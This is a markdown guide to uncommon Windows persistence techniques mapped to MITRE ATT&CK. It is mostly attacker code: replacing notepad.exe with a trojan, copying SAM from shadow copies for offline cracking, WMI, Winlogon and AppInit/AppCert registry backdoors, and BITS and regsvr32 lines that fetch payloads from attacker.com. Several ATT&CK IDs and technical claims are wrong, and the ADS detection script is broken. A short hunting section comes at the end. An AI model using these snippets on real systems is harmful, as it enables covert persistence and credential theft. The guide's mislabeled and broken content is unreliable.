# Uncommon & Obscure Windows Persistence Methods

## MITRE ATT&CK Mapping
- **IDs**: T1546.008, T1027, T1560, T1546.003, T1197
- **Tactic**: TA0003 (Persistence) / TA0005 (Defense Evasion)
- **Platforms**: Windows 10/11, Server 2016+

## Overview
Most documentation stops at Run keys and Scheduled Tasks. This covers techniques rarely seen in public research but used by advanced threat actors because they operate under legitimate mechanisms that bypass most baselines.

## Uncommon Methods

### 1. NTFS Transactional File System (T1560)
Uses built-in NTFS transaction APIs to persist files atomically:

```powershell
Start-Transaction -Scope Process
Copy-Item "C:\malware\trojan.exe" "C:\Windows\System32\notepad.exe" -Force
Complete-Transaction
# Logs via Event ID 4659 (pre-delete) in Security log
```

### 2. Shadow Copy Credential Harvesting (T1029)
Abuse VSS to steal credentials without writing malware:

```powershell
vssadmin create shadow /for=C:
mountvol Z: \\?\globalroot\device\shadowcopy1\
# Copy SAM/HKLM SYSTEM from Z:\Windows\System32\config\ for offline cracking
```

### 3. Permanent WMI Event Subscriptions (T1546.003)
Stored in the CIM repository — survives reboots and user deletion:

```powershell
$filterArgs = @{Name='HealthCheck'; EventNameSpace='root\cimv2'; 
    QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_Process"'}
Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs | Out-Null

$consumerArgs = @{Name='MaintenanceConsumer'; CommandLineTemplate='C:\Windows\Temp\svc-update.exe'}
Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs | Out-Null

Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name='HealthCheck'"
    Consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name='MaintenanceConsumer'"
}
```

### 4. COM Object Hijacking (T1546.002)

```reg
[HKEY_CLASSES_ROOT\CLSID\{7B5C2D8F-1A3E-4F5B-9C6D-2E8A7F1B4C3D}\InprocServer32]
@="C:\\Windows\\System32\\legit-looking.dll"
"ThreadingModel"="Apartment"
```

### 5. BITS Job Persistence (T1197) — Stealthy C2 Channel

```powershell
Start-BitsTransfer -Source "http://attacker.com/command.txt" -Destination "C:\Windows\Temp\bcs.tmp" -Description "Office Update Helper"
# Bits jobs tracked in C:\ProgramData\Microsoft\Windows\BITS\ — rarely audited
```

### 6. AppCert DLLs (T1546.008) — Stealthy DLL Injection

```reg
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]
"AppCertDLLs"="C:\\Windows\\System32\\updatehelper.dll"
```


### 7. AppInit DLLs (T1546.004) — Deprecated but Still Effective

```reg
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows]
"AppInit_DLLs"="C:\\Windows\\System32\\legit-looking.dll"
"LoadAppInit_DLLs"=dword:00000001
```

### 8. Userinit / Winlogon Shell (T1547.004) — Survives Reboots & Logoffs

```reg
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
"Shell"="explorer.exe,C:\\ProgramData\\backdoor_shell.exe"
"Userinit"="userinit.exe, C:\\ProgramData\\svc-update.exe"
```

### 9. RegSvr32 / MSI Persistence (T1218.011)
Legitimate installers for persistent execution:

```powershell
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
msiexec /qn /i C:\Windows\Temp\update_helper.msi
```

### 10. DLL Side-Loading (T1574.001)
Place malicious DLL in same directory as a legitimate signed app:

```powershell
Copy-Item "malicious.dll" "C:\Program Files\LegitApp\helper.dll" -Force
```

### 11. Time Provider Persistence (T1547.003) — Extremely Obscure

```reg
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\Parameters]
"Type"="NTP"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Providers]
"NTLM"="C:\\Windows\\System32\\\\msv1_0.dll, C:\\malicious_provider.dll"
```

### 12. Alternate Data Streams (ADS) Persistence
Hide payloads inside streams on system files:

```cmd
echo @echo off^>C:\Windows\Temp\hidden.bat > C:\Windows\System32\cmd.exe:payload.bat
copy /b malicious.exe + image.jpg payload.exe
```


## Detection & Hunting

### Registry & Subscription Hunt
```powershell
Write-Host "=== OBSCURE PERSISTENCE HUNT ===" -ForegroundColor Cyan

$checks = @{
    "AppCert DLLs" = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs"
    "AppInit DLLs" = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
    "Userinit"     = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
    "Shell"        = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"
}

foreach ($check in $checks.GetEnumerator()) {
    Write-Host "`n[$($check.Key)]" -ForegroundColor Yellow
    Get-ItemProperty $check.Value 2>$null | Format-List *
}

Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select Name, Query
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Select Name, CommandLineTemplate
Get-BitsTransfer -AllUsers | Where-Object { $_.JobType -eq "Client" }
```

### ADS Detection
```powershell
Get-ChildItem C:\Windows -Recurse -Force | Get-Content -Stream * | Where-Object { $_.PSIsContainer -eq $false }
```

## Defense Strategy
1. Monitor HKLM\System\CurrentControlSet\Control\Session Manager for AppCert/AppInit changes
2. Audit WMI permanent event subscriptions regularly
3. Disable AppInit DLLs: set LoadAppInit_DLLs to 0 and enable RequireSignedAppInitDLLs
4. FIM on System32, Program Files, and registry keys above

## References
- Microsoft Docs: Session Manager Configuration (AppCert/AppInit)
- Windows Internals 7th Ed., Chapter 10
- MITRE ATT&CK T1546.008, T1560, T1197
